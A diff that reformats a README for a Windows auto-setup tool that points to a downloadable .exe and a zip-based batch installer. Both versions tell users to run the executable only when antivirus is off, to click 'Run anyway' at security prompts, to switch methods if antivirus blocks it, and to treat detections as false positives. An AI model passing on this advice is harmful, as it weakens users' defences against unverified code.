@@ -1,69 +1,61 @@
 # TTGM Automatic Setup
 
-## 🛠️ Simple Installation Instructions
+## Simple Installation Instructions
 
-This project is prepared to run **after an automated ISO installation**. Below are two installation methods:
-
----
-
-### 🔹 1) Easy Method (Recommended)
-
-If there is **no antivirus** actively running on your computer, simply download and run the file below:
-
-👉 [Download TTAutoSetup.exe](https://github.com/7yasin/ttautosetup/releases/download/supportassist/TTAutoSetup.exe)
-
-> This executable handles everything for you. During installation, you may see security prompts — choose **“Run anyway”** to proceed.
+This project is intended to run **after an automated ISO installation**. Two installation methods are provided.
 
 ---
 
-### 🔹 2) Alternative Method (If antivirus blocks the .exe)
+### 1) Easy Method (Recommended)
 
-Some antivirus products may block the automatic installer. In that case, download the `.zip` below and run the `kurulum.bat` inside:
+If no antivirus software is actively running on your system, download and run:
 
-👉 [Download autoSetup.zip](https://github.com/7yasin/ttautosetup/releases/download/supportassist/autoSetup.zip)
+- **TTAutoSetup.exe:**  
+  https://github.com/7yasin/ttautosetup/releases/download/supportassist/TTAutoSetup.exe
 
-**Contents:**
-- `kurulum.bat` → Installs Python if needed and starts the setup.
-- `main.py` → Main installer script (runs automatically).
-
----
-
-📌 **Note:** The installers are safe. However, some antivirus tools may incorrectly flag them (false positive).
+During installation, Windows may display security prompts. Select “Run anyway” to proceed.
 
 ---
 
-## ⚙️ For Developers and Technical Users
+### 2) Alternative Method (if antivirus blocks the .exe)
 
-This project provides two distribution methods:
+If your antivirus prevents the executable from running, download the archive below and execute the batch file inside:
 
----
+- **autoSetup.zip:**  
+  https://github.com/7yasin/ttautosetup/releases/download/supportassist/autoSetup.zip
 
-### 🔸 1) Single Executable (Standalone .exe)
+**Contents**
+- `kurulum.bat` — Checks for Python and starts the setup.
+- `main.py` — Main installer script (invoked automatically by the batch file).
 
-- File: [`TTAutoSetup.exe`](https://github.com/7yasin/ttautosetup/releases/download/supportassist/TTAutoSetup.exe)  
-- Purpose: Run the automation even on systems **without** a pre-installed Python.  
-- Detail: The `main.py` script is packaged with **PyInstaller** and launches configuration tasks directly.
-
-**Note:** Most antivirus tools do not yet recognize this .exe and allow it to run, but some systems may still show false positives.
-
----
-
-### 🔸 2) Source + Batch-Based Installer (Fallback)
-
-- Package: [`autoSetup.zip`](https://github.com/7yasin/ttautosetup/releases/download/supportassist/autoSetup.zip)  
-- Includes:
-  - `main.py` – Python script
-  - `kurulum.bat` – Checks/installs Python and runs the script
-- Detail: If the .exe is blocked, this alternative installs Python on Windows (if missing) and then executes `main.py`.
+> Note: The installers are safe. Some antivirus tools may show false positives.
 
 ---
 
-### Additional Information
+## For Developers and Technical Users
 
-- `kurulum.bat` checks whether Python is installed on Windows.  
-- If needed, it installs Python (via Microsoft Store or direct installer).  
-- Afterwards, the script applies the required system configuration automatically.
+Two distribution options are available:
+
+### A. Single Executable (Standalone .exe)
+- **File:** `TTAutoSetup.exe`  
+- **Purpose:** Run on systems without a pre-installed Python runtime.  
+- **Details:** `main.py` is packaged with PyInstaller and starts configuration tasks directly.  
+- **Antivirus:** Some environments may still flag the binary as a false positive.
+
+### B. Source + Batch-Based Installer (Fallback)
+- **Package:** `autoSetup.zip`  
+- **Includes:** `main.py` (Python script) and `kurulum.bat` (checks/installs Python and runs the script).  
+- **Behavior:** If Python is missing, the batch file installs it (Microsoft Store or direct installer) and then executes `main.py`.
 
 ---
 
-**Security Note:** The source files are openly provided. You can review `main.py` and build your own executable if desired.
+## Additional Information
+
+- `kurulum.bat` verifies Python availability on Windows and installs it if necessary.  
+- After prerequisites are met, the script applies all required system configuration steps automatically.
+
+---
+
+## Security Note
+
+The source files are provided openly. You may review `main.py` and build your own executable if needed.
